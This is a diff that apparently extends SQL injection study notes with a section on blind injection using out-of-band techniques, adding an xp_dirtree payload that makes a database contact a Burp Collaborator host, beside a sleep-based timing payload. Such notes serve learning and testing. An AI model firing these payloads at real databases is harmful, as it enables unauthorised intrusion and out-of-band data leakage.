@@ -64,6 +64,12 @@ For a UNION query to work, two key requirements must be met:
 > SELECT sleep(10) MySQL
 ```
 
+##### Exploiting blind SQL injection using out-of-band (OAST) techniques
+
+```sql
+> '; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'-- 
+```
+
 #### How to detect SQL injection vulnerabilities
 
 ```sql
